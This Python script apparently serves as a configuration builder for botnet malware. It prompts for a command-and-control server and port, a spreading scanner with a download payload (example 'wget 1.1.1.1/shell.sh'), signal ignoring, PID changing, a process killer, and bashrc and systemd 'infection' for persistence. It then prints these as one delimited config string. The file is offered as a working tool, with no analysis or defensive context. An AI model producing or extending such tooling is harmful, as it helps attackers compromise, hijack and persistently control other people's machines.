
from os import system


def getinput():
    bot_server = input("[1/14] Bot server (ex. 127.0.0.1):\n")
    handleinput(bot_server)
    bot_port = input("[2/14] Bot port (ex. 1929):\n")
    handleinput(bot_port)

    debug = input(
        "[3/14] Debug (true/false):\n")

    handleinput(debug)

    scanner_enabled = input("[4/14] Scanner enabled (true/false):\n")
    handleinput(scanner_enabled)

    if scanner_enabled == "true":
        payload = input(
            "[5/14] Payload (ex. wget 1.1.1.1/shell.sh):\n")

        handleinput(payload)

        scanner_mcpu = input(
            "[6/14] Scanner min cpu count (ex. 3):\n")

        handleinput(scanner_mcpu)
    else:
        payload = "null"
        scanner_mcpu = "0"

    maxcpu_u = input(
        "[7/14] Max cpu usage (ex. 90):\n")

    handleinput(maxcpu_u)

    ignore_signals = input(
        "[8/14] Ignore signals (true/false):\n")

    handleinput(ignore_signals)

    if ignore_signals == "true":
        pid_changer = input(
            "[9/14] Pid changer (true/false):\n")

        handleinput(pid_changer)
    else:
        pid_changer = "false"

    killer_enabled = input(
        "[10/14] Killer enabled (true/false):\n")

    handleinput(killer_enabled)

    if killer_enabled == "true":

        max_killed_pid = input(
            "[11/14] Killer max pid (ex. 100000) (if -1 no limit):\n")

        handleinput(max_killed_pid)

        min_killer_pid = input(
            "[12/14] Killer min pid (ex. 100):\n")

        handleinput(min_killer_pid)
    else:
        max_killed_pid = 0
        min_killer_pid = 0

    bashrc_inf = input(
        "[13/14] Bashrc infection enabled (true/false):\n")

    handleinput(bashrc_inf)

    sysd_inf = input(
        "[14/14] Systemd infection enabled (true/false):\n")

    handleinput(sysd_inf)

    res = f"{bot_server}\\\\{bot_port}\\\\{ignore_signals}\\\\{scanner_enabled}\\\\{scanner_mcpu}\\\\{maxcpu_u}\\\\{pid_changer}\\\\{debug}\\\\{min_killer_pid}|{max_killed_pid}\\\\{killer_enabled}\\\\{bashrc_inf}\\\\{sysd_inf}\\\\{payload}"

    print("==================== CONFIG ====================\n" + res)


def handleinput(inp):
    if inp == "":
        print("Invalid input")
        exit(0)


if __name__ == '__main__':
    getinput()
